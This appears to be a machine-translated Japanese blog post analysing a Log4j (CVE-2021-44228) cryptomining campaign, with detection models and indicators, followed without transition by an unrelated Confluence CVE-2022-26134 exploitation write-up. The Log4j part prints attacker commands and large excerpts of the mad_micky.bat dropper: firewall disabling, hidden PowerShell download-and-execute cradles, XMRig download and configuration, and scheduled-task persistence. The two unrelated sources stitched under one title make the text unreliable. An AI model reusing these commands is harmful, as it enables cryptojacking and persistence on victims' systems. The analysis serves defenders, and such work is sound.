# Log4j の危険な脆弱性 CVE-2021-44228 を悪用する暗号通貨マイニング コードのエクスプロイト

<!-- wp:embed {"url":"https://www.youtube.com/embed/PNDBjoT83zA","type":"rich","providerNameSlug":"вставить-обработчик","responsive":true,"className":"wp-embed-aspect-16-9 wp-has-aspect-ratio"} -->
<figure class="wp-block-embed is-type-rich is-provider-вставить-обработчик wp-block-embed-вставить-обработчик wp-embed-aspect-16-9 wp-has-aspect-ratio"><div class="wp-block-embed__wrapper">
https://www.youtube.com/embed/PNDBjoT83zA
</div></figure>
<!-- /wp:embed -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3>Log4j の背景</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Alibaba Cloud セキュリティ チームは、Apache Log4j2 (Log4Shell) の複数のバージョンに対して認証されていないリモート コード実行を可能にする重大な脆弱性<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2021-44228" target="_blank" rel="noreferrer noopener">(CVE-2021-44228)を公開しました。</a>脆弱なサーバーは、HTTPS などの任意のプロトコルを介して接続し、特別に細工された文字列を送信する攻撃者によって悪用される可能性があります。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3>Log4j 暗号マイニング キャンペーン</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Darktrace は、この Log4j の脆弱性を悪用した結果として発生した、複数の顧客の展開で暗号マイニングを検出しました。これらのインシデントのそれぞれで、base64 でエンコードされた PowerShell スクリプトを要求して境界防御をバイパスし、バッチ (.bat) スクリプト ファイルをダウンロードするように見えるアウトバウンド SSL 接続と、暗号マイニング マルウェアをインストールする複数の実行可能ファイルを介してエクスプロイトが発生しました。この活動には、一般的なハードコードされた IP、実行可能ファイル、スクリプトなど、より広範なキャンペーン指標が含まれていました。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>攻撃サイクルは、Log4j エクスプロイトに対して脆弱な VMWare Horizo​​ns サーバーを探す、インターネットに接続されたデバイスの日和見的スキャンと思われるものから始まります。脆弱なサーバーが見つかると、攻撃者は被害者への HTTP および SSL 接続を確立します。悪用に成功すると、サーバーはポート 1389 でコールバックを実行し、mad_micky.bat という名前のスクリプトを取得します。これにより、次のことが達成されます。</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><!-- wp:list-item -->
<li>すべてのプロファイルを state=off に設定して Windows ファイアウォールを無効にします<br>'netsh advfirewall set allprofiles state off'</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>「netstat -ano |」を使用して、他のマイナーのインストールを示す既存のプロセスを検索します。findstr TCP' は、ポート :3333、:4444、:5555、:7777、:9000 で動作しているプロセスを特定し、実行中のプロセスを停止します。</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>wxm.exe をサイレント モードでダウンロードするために、新しい Web クライアントが開始されます。</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>スケジュールされたタスクは永続性を作成するために使用されます。コマンド「schtasks /create /F /sc minute /mo 1 /tn –」は、タスクをスケジュールし、警告を抑制します。タスクは、コマンドの 1 分以内にスケジュールされ、悪意のあるドメインを指す「BrowserUpdate」という名前が付けられます。 「b.oracleservice[.]top」およびハードコーディングされた IP: 198.23.214[.]117:8080 -o 51.79.175[.]139:8080 -o 167.114.114[.]169:8080</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>永続化のために RunOnce にレジストリ キーが追加されます: reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Run2 /d</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>少なくとも 2 つのケースで、mad_micky.bat スクリプトは、ユーザー エージェント Mozilla/5.0 (互換性あり; MSIE 10.0; Windows NT 6.2; Win64; x64; Trident/6.0; MAARJS) を持つ HTTP 接続で取得されました。これは、このユーザー エージェントがこれらのネットワークで確認された最初で唯一の例です。このユーザー エージェントは、工場出荷時に新しくインストールされた一部の ASUS デバイスで合法的に使用されているようです。ただし、新しいユーザー エージェントはこのアクティビティ中にのみ見られるため、疑わしいものです。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>悪用に成功すると、サーバーはポート 1389 でコールバックを実行し、スクリプト ファイルを取得します。この例では、/xms.ps1 は base-64 でエンコードされた PowerShell スクリプトであり、ホストの実行ポリシーをバイパスして「mad_micky.bat」を呼び出します。</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://assets-global.website-files.com/626ff4d25aca2edf4325ff97/62d2a548a73d901f998b427c_1-1.jpeg" alt="Log4j の危険な脆弱性 CVE-2021-44228 を悪用する暗号通貨マイニング コードのエクスプロイト"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><em>図 1: PowerShell スクリプト xms.ps1 に関する追加の洞察</em></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>スナップショットは、影響を受けるサーバーのイベント ログの詳細を示し、mad_micky.bat ファイルのダウンロードにつながる成功した Log4j RCE を示しています。</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://assets-global.website-files.com/626ff4d25aca2edf4325ff97/62d2a5485d3ddb97cd7d959a_1-2.jpeg" alt="Log4j の危険な脆弱性 CVE-2021-44228 を悪用する暗号通貨マイニング コードのエクスプロイト"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><em>図 2: mad_micky.bat ファイルを強調表示するログ データ</em></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>実行可能ファイルとスクリプトを取得するために、追加の接続が開始されました。スクリプトには、韓国とウクライナにある 2 つの IP アドレスが含まれていました。マイナーを起動する実行ファイル xm.exe をダウンロードするために、ウクライナの IP への接続が確立されました。マイナーである XMRig Miner (この場合) は、複数のパブリック サイトからダウンロードできるオープン ソースのクロスプラットフォーム マイニング ツールです。次に確認された exe のダウンロードは、「wxm.exe」(f0cf1d3d9ed23166ff6c1f3deece19b4) でした。</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://assets-global.website-files.com/626ff4d25aca2edf4325ff97/62d2a548633c395a4ad861e7_1-3.png" alt="Log4j の危険な脆弱性 CVE-2021-44228 を悪用する暗号通貨マイニング コードのエクスプロイト"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><em>図 3: XMRig 実行可能ファイルに関する追加の洞察</em></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>韓国の IP への接続には、別のスクリプト (/2.ps1) と実行可能ファイル (LogBack.exe) の要求が含まれていました。このスクリプトは、SCM イベント ログ フィルターや PowerShell イベント ログ コンシューマーなど、ログに関連する実行中のタスクを削除します。このスクリプトは、Pastebin からのファイルも要求します。これは、Cobalt Strike ビーコン構成ファイルである可能性があります。ログの削除は、スケジュールされたタスクによって実行され、WMI には、イベントロガー、SCM イベント ログ フィルター、DSM イベント ログ コンシューマー、PowerShell イベント ログ コンシューマー、Windows イベント コンシューマー、BVTConsumer が含まれていました。</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><!-- wp:list-item -->
<li>構成ファイル (ホストされなくなりました): IEX (New-Object System.Net.Webclient) DownloadString('hxxps://pastebin.com/raw/g93wWHkR')</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>Pastebin から要求された 2 番目のファイルは、もはや Pastebin によってホストされていませんが、schtasks コマンドの一部であるため、永続化を確立するために使用される可能性があります。</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><!-- wp:list-item -->
<li>schtasks /create /sc MINUTE /mo 5 /tn “\Microsoft\windows\.NET Framework\.NET Framework NGEN v4.0.30319 32” /tr “c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe - WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(”hxxps://pastebin.com/raw/bcFqDdXx”'))'” /F /ru システム</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>実行可能ファイル Logback.exe は、別の XMRig マイニング ツールです。config.json ファイルも同じ韓国の IP からダウンロードされました。この後、cmd.exe と wmic コマンドを使用してマイナーを構成しました。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>これらのファイルのダウンロードとマイナーの構成に続いて、Pastebin への追加の接続が行われました。</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://assets-global.website-files.com/626ff4d25aca2edf4325ff97/62d2a54849ba531521cac33f_1-4.jpeg" alt="Log4j の危険な脆弱性 CVE-2021-44228 を悪用する暗号通貨マイニング コードのエクスプロイト"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><em>図 4: mad_micky.bat ファイルの OSINT 相関関係</em></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3>プロセスの詳細 — mad_micky.bat ファイル</h3>
<!-- /wp:heading -->

<!-- wp:heading {"level":4} -->
<h4>インストール</h4>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code>set “STARTUP_DIR=%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup”
set “STARTUP_DIR=%USERPROFILE%\Start Menu\Programs\Startup”

looking for the following utilities: powershell, find, findstr, tasklist, sc
set “LOGFILE=%USERPROFILE%\mimu6\xmrig.log”
if %EXP_MONER_HASHRATE% gtr 8192 ( set PORT=18192 &amp; goto PORT_OK)
if %EXP_MONER_HASHRATE% gtr 4096 ( set PORT=14906 &amp; goto PORT_OK)
if %EXP_MONER_HASHRATE% gtr 2048 ( set PORT=12048 &amp; goto PORT_OK)
if %EXP_MONER_HASHRATE% gtr 1024 ( set PORT=11024 &amp; goto PORT_OK)
if %EXP_MONER_HASHRATE% gtr 512 ( set PORT=10512 &amp; goto PORT_OK)
if %EXP_MONER_HASHRATE% gtr 256 ( set PORT=10256 &amp; goto PORT_OK)
if %EXP_MONER_HASHRATE% gtr 128 ( set PORT=10128 &amp; goto PORT_OK)
if %EXP_MONER_HASHRATE% gtr 64 ( set PORT=10064 &amp; goto PORT_OK)
if %EXP_MONER_HASHRATE% gtr 32 ( set PORT=10032 &amp; goto PORT_OK)
if %EXP_MONER_HASHRATE% gtr 16 ( set PORT=10016 &amp; goto PORT_OK)
if %EXP_MONER_HASHRATE% gtr 8 ( set PORT=10008 &amp; goto PORT_OK)
if %EXP_MONER_HASHRATE% gtr 4 ( set PORT=10004 &amp; goto PORT_OK)
if %EXP_MONER_HASHRATE% gtr 2 ( set PORT=10002 &amp; goto PORT_OK)
set port=10001</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":4} -->
<h4>マイナーの準備</h4>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code>echo &#91;*] Removing previous mimu miner (if any)
sc stop gado_miner
sc delete gado_miner
taskkill /f /t /im xmrig.exe
taskkill /f /t/im logback.exe
taskkill /f /t /im network02.exe
:REMOVE_DIR0
echo &#91;*] Removing “%USERPROFILE%\mimu6” directory
timeout 5
rmdir /q /s “USERPROFILE%\mimu6” &gt;NUL 2&gt;NUL
IF EXIST “%USERPROFILE%\mimu6” GOTO REMOVE_DIR0</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":4} -->
<h4>XMRIGのダウンロード</h4>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code>echo &#91;*] Downloading MoneroOcean advanced version of XMRig to “%USERPROFILE%\xmrig.zip”
powershell -Command “$wc = New-Object System.Net.WebClient; $wc.DownloadFile(‘http://141.85.161&#91;.]18/xmrig.zip’, ;%USERPROFILE%\xmrig.zip’)”
echo copying to mimu directory
if errorlevel 1 (
echo ERROR: Can’t download MoneroOcean advanced version of xmrig
goto MINER_BAD)</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":4} -->
<h4>開梱してインストール</h4>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code>echo &#91;*] Unpacking “%USERPROFILE%\xmrig.zip” to “%USERPROFILE%\mimu6”
powershell -Command “Add-type -AssemblyName System.IO.Compression.FileSystem; &#91;System.IO.Compression.ZipFile]::ExtractToDirectory(‘%USERPROFILE%\xmrig.zip’, ‘%USERPROFILE%\mimu6’)”
if errorlevel 1 (
echo &#91;*] Downloading 7za.exe to “%USERPROFILE%za.exe”
powershell -Command “$wc = New-Object System.Net.WebClient; $wc.Downloadfile(‘http://141.85.161&#91;.]18/7za.txt’, ‘%USERPROFILE%za.exe’”

powershell -Command “$out = cat ‘%USERPROFILE%\mimu6\config.json’ | %%{$_ -replace ‘\”url\”: *\”.*\”,’, ‘\”url\”: \”207.38.87&#91;.]6:3333\”,’} | Out-String; $out | Out-File -Encoding ASCII ‘%USERPROFILE%\mimu6\config.json’”
powershell -Command “$out = cat ‘%USERPROFILE%\mimu6\config.json’ | %%{$_ -replace ‘\”user\”: *\”.*\”,’, ‘\”user\”: \”%PASS%\”,’} | Out-String; $out | Out-File -Encoding ASCII ‘%USERPROFILE%\mimu6\config.json’”
powershell -Command “$out = cat ‘%USERPROFILE%\mimu6\config.json’ | %%{$_ -replace ‘\”pass\”: *\”.*\”,’, ‘\”pass\”: \”%PASS%\”,’} | Out-String; $out | Out-File -Encoding ASCII ‘%USERPROFILE%\mimu6\config.json’”
powershell -Command “$out = cat ‘%USERPROFILE%\mimu6\config.json’ | %%{$_ -replace ‘\”max-cpu-usage\”: *\d*,’, ‘\”max-cpu-usage\”: 100,’} | Out-String; $out | Out-File -Encoding ASCII ‘%USERPROFILE%\mimu6\config.json’”
set LOGFILE2=%LOGFILE:\=\\%
powershell -Command “$out = cat ‘%USERPROFILE%\mimu6\config.json’ | %%{$_ -replace ‘\”log-file\”: *null,’, ‘\”log-file\”: \”%LOGFILE2%\”,’} | Out-String; $out | Out-File -Encoding ASCII ‘%USERPROFILE%\mimu6\config.json’”
if %ADMIN% == 1 goto ADMIN_MINER_SETUP

if exist “%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup” (
set “STARTUP_DIR=%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup”
goto STARTUP_DIR_OK
)
if exist “%USERPROFILE%\Start Menu\Programs\Startup” (
set “STARTUP_DIR=%USERPROFILE%\Start Menu\Programs\Startup”
goto STARTUP_DIR_OK
)
echo &#91;*] Downloading tools to make gado_miner service to “%USERPROFILE%\nssm.zip”
powershell -Command “$wc = New-Object System.Net.WebClient; $wc.DownloadFile(‘&#91;http://141.85.161&#91;.]18/nssm.zip’, ‘%USERPROFILE%\nssm.zip’)”
if errorlevel 1 (
echo ERROR: Can’t download tools to make gado_miner service
exit /b 1</code></pre>
<!-- /wp:code -->

<!-- wp:heading {"level":3} -->
<h3>Darktrace を使用したキャンペーンの検出</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>このキャンペーンを特定するために使用された Darktrace の主要な侵害モデルには、&nbsp;&nbsp;<em>Uncommon Port の Application Protocol</em>、&nbsp;&nbsp;<em>Rare From Server への発信接続</em>、および&nbsp;<em>Rare Destination への Beaconing の侵害に</em>重点を置いたモデルが含まれます。<em>マスカレード ファイル転送</em>、&nbsp;<em>まれな場所からの複数の実行可能ファイルとスクリプト</em>、および&nbsp;<em>まれな外部場所からの圧縮コンテンツ の</em>ファイルに焦点を当てたモデル&nbsp;。<em>暗号通貨マイニングは、暗号通貨マイニング アクティビティ</em>モデルで検出されます&nbsp;&nbsp;。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><em>Unusual PowerShell to Rare および New User Agent</em>に関連付けられたモデルは、&nbsp;&nbsp;&nbsp;Log4j コールバックに続く、感染したデバイスの異常な接続を強調しています。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Darktrace の&nbsp;<a href="https://www.darktrace.com/en/autonomous-response">Autonomous Response</a>&nbsp;テクノロジである Antigena を使用している顧客は、ダウンロードされた着信ファイルとスクリプトをブロックし、感染したデバイスを通常の生活パターンに制限して、最初の悪意のあるファイルのダウンロードと進行中の暗号マイニング活動の両方を防ぐアクションも実行しました。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3>付録</h3>
<!-- /wp:heading -->

<!-- wp:heading {"level":4} -->
<h4>Darktrace モデルの検出</h4>
<!-- /wp:heading -->

<!-- wp:list -->
<ul><!-- wp:list-item -->
<li>異常なポートでの異常な接続/アプリケーション プロトコル</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>異常な接続/ホスト名のない IP への新しいユーザー エージェント</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>異常な接続 / PowerShell からまれな外部へ</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>まれな外部ロケーションからの異常なファイル/EXE</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>異常なファイル / なりすましファイル転送</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>まれな外部の場所からの異常なファイル/複数の EXE</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>まれな外部ロケーションからの異常なファイル/スクリプト</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>まれな外部ロケーションからの異常なファイル/Zip または Gzip</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>異常なサーバー アクティビティ / サーバーからの発信</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>コンプライアンス・仮想通貨マイニング活動</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>侵害 / エージェント ビーコン (長期)</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>侵害 / エージェント ビーコン (中期)</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>侵害 / エージェント ビーコン (短期間)</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>侵害 / 若いエンドポイントへのビーコン</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>外部への侵害 / ビーコン活動 レア</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>侵害/暗号通貨マイニング活動</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>まれなエンドポイントへの侵害/持続的な TCP ビーコン アクティビティ</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>デバイス/新しい PowerShell ユーザー エージェント</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>デバイス / 不審なドメイン</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:heading {"level":4} -->
<h4>MITRE ATT&amp;CK テクニックの観察</h4>
<!-- /wp:heading -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://assets-global.website-files.com/626ff4d25aca2edf4325ff97/62ea70a286d2172d033147de_mitre%20CobaltStrike%20.jpg" alt="Log4j の危険な脆弱性 CVE-2021-44228 を悪用する暗号通貨マイニング コードのエクスプロイト"/></figure>
<!-- /wp:image -->

<!-- wp:heading {"level":4} -->
<h4>IoC</h4>
<!-- /wp:heading -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://assets-global.website-files.com/626ff4d25aca2edf4325ff97/62f11eea9576fd4b2e26c440_iocs%201%20log4j.jpg" alt="Log4j の危険な脆弱性 CVE-2021-44228 を悪用する暗号通貨マイニング コードのエクスプロイト"/></figure>
<!-- /wp:image -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://assets-global.website-files.com/626ff4d25aca2edf4325ff97/62f11ef37345022b8dfb2403_iocs%202%20log4j.jpg" alt="Log4j の危険な脆弱性 CVE-2021-44228 を悪用する暗号通貨マイニング コードのエクスプロイト"/></figure>
<!-- /wp:image -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://assets-global.website-files.com/626ff4d25aca2edf4325ff97/62f11efdb7ece0f3fab42a28_iocs%203%20log4j.jpg" alt="Log4j の危険な脆弱性 CVE-2021-44228 を悪用する暗号通貨マイニング コードのエクスプロイト"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>5 月 31 日、すべての confluence サーバーとデータ センターがサポートするバージョンに影響を与える、パッチが適用されていない重大な脆弱性が、&nbsp;&nbsp;セキュリティ会社の Volexity によって Atlassian に<a href="https://www.volexity.com/blog/2022/06/02/zero-day-exploitation-of-atlassian-confluence/">報告されました。</a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Atlassian は&nbsp;6 月 2 日に重大な脆弱性について顧客に<a href="https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html">警告し</a>&nbsp;、1 日後にパッチを発行しました。CISA は 6 月 3 日に、この脆弱性を既知の悪用された脆弱性のリストに追加しました。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Check Point は、この脆弱性を悪用する攻撃を防止するための専用の保護をリリースし、影響を受けるシステムにパッチを適用するようお客様にアドバイスしています。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>脆弱性</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-26134" target="_blank" rel="noreferrer noopener">CVE-2022-26134</a>として指定されている Atlassian Confluence および Data Center の脆弱性は、認証されていない Object-Graph Navigation Language (OGNL) 式インジェクション攻撃につながる可能性があります。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>リモートの認証されていない攻撃者は、この脆弱性を利用して、URI に悪意のあるペイロードを配置することにより、標的のサーバー上で任意のコードを実行できます。</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://blog.checkpoint.com/wp-content/uploads/2022/06/y1.png" alt="Log4j の危険な脆弱性 CVE-2021-44228 を悪用する暗号通貨マイニング コードのエクスプロイト"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p id="caption-attachment-28249"><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-26134" target="_blank" rel="noreferrer noopener">図 1: CVE-2022-26134</a>を悪用する悪意のあるペイロード。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>野生の搾取</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Check Point Research (CPR) の研究者は、脆弱性が公開されて以来、多数のエクスプロイトが試みられていることに気付きました。当初、攻撃者候補の多くは、脆弱なターゲットを特定するためにスキャン方法を使用していました。数日後、攻撃者はこの脆弱性を利用して、影響を受けるシステムにマルウェアをダウンロードし始めました。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>研究者は、エクスプロイト ログの中で、同じキャンペーンに関連し、同じソースから発信されたものの異なるプラットフォーム (Linux と Windows) を標的とした悪意のあるペイロードがいくつかあることに気付きました。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>感染チェーンは、被害者のオペレーティング システムによって異なります。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>Linux OS を標的とした攻撃</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>攻撃者は、巧妙に細工された HTTP リクエストを被害者に送信することで、Atlassian のゼロデイ脆弱性を利用しました。</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://blog.checkpoint.com/wp-content/uploads/2022/06/y2.png" alt="Log4j の危険な脆弱性 CVE-2021-44228 を悪用する暗号通貨マイニング コードのエクスプロイト"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p id="caption-attachment-28250">図 2: base64 でエンコードされたペイロードで CVE-2022-26134 を悪用する、巧妙に細工された HTTP リクエスト。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>base64 文字列は、base64 でエンコードされた別の文字列にデコードされます。全体として、研究者は実際のペイロードを取得するために文字列を数回デコードする必要がありました。</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://blog.checkpoint.com/wp-content/uploads/2022/06/y3.png" alt="Log4j の危険な脆弱性 CVE-2021-44228 を悪用する暗号通貨マイニング コードのエクスプロイト"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p id="caption-attachment-28251">図 3: デコードされた base64 文字列。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><em>このスクリプトは、 xms</em>という bash スクリプト ファイルを&nbsp;&nbsp;リモート C&amp;C サーバーから被害者の tmp フォルダーにダウンロードして実行し、その後削除します。</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://blog.checkpoint.com/wp-content/uploads/2022/06/y4.png" alt="Log4j の危険な脆弱性 CVE-2021-44228 を悪用する暗号通貨マイニング コードのエクスプロイト"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p id="caption-attachment-28252">図 4: 悪意のある xms スクリプトの一部。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>xms&nbsp;ファイル<em>は</em>&nbsp;ドロッパー スクリプトです。被害者のマシンから実行中のエージェントをアンインストールし、自身を cron ジョブに追加して、再起動時に持続性を維持します。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>さらに、[.]oracleservice.top へのネットワーク接続テストが定期的に実行されます。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>他のマシンに拡散しようとして、スクリプトは ssh キーを検索し、接続を試みます。次に、C&amp;C サーバーから xms ファイルをダウンロードして実行します。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><em>このスクリプトは、 dbused&nbsp;</em>という名前の elf 実行可能ファイルを&nbsp;さまざまなリモート IP の<em>&nbsp;tmp&nbsp;</em>フォルダーにダウンロードします。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>dbused&nbsp;ファイルは<em>、</em>&nbsp;静的検出を避けるために upx を使用して圧縮されます。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>elf ファイルは、被害者のマシンのリソースを使い果たすクリプト マイナーです。</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://blog.checkpoint.com/wp-content/uploads/2022/06/y5.png" alt="Log4j の危険な脆弱性 CVE-2021-44228 を悪用する暗号通貨マイニング コードのエクスプロイト"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p id="caption-attachment-28253">図 5: dbused プロセスはシステム リソースを使い果たします。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>Windows OS を標的とした攻撃</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>攻撃者は、アトラシアンの脆弱性を利用して PowerShell ダウンロード クレードルを実行し、リモート C&amp;C サーバーからファイルレス攻撃を開始しました。</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://blog.checkpoint.com/wp-content/uploads/2022/06/y6.png" alt="Log4j の危険な脆弱性 CVE-2021-44228 を悪用する暗号通貨マイニング コードのエクスプロイト"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p id="caption-attachment-28254">図 6: PowerShell コマンドを使用して CVE-2022-26134 を悪用する、巧妙に細工された HTTP リクエスト。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><em>lol.ps1</em>スクリプト&nbsp;&nbsp;は、PowerShell メモリ プロセスに挿入されます。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><em>スクリプトは、 wmi</em>を使用してプロセッサのアーキテクチャを検証し、&nbsp;&nbsp;要件に一致するかどうかを確認します。<em>次に、 checkit2</em><br>という実行可能ファイルを&nbsp;<em>&nbsp;tmp</em>フォルダー&nbsp;にダウンロードし&nbsp;、非表示モードで実行します。<em></em><em></em></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://blog.checkpoint.com/wp-content/uploads/2022/06/y7.png" alt="Log4j の危険な脆弱性 CVE-2021-44228 を悪用する暗号通貨マイニング コードのエクスプロイト"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p id="caption-attachment-28255">図 7: lol.ps1 スクリプト。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>checkit2.exeプロセスは、&nbsp;&nbsp;C&amp;C サーバーに接続する<em>InstallUtil.exe</em>&nbsp;という子プロセスを生成します&nbsp;<em>&nbsp;。</em>&nbsp;次に、InstallUtil.exe は別の子プロセスの子プロセスである AddInProcess.exe を生成します&nbsp;。&nbsp;<em>これ</em><em>は&nbsp;</em>クリプト マイナーです。被害者のマシンでしばらく実行すると、&nbsp;&nbsp;<em>checkit2</em>&nbsp;プロセスが終了します。<em></em><em></em><em></em><em></em></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://blog.checkpoint.com/wp-content/uploads/2022/06/y8.png" alt="Log4j の危険な脆弱性 CVE-2021-44228 を悪用する暗号通貨マイニング コードのエクスプロイト"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
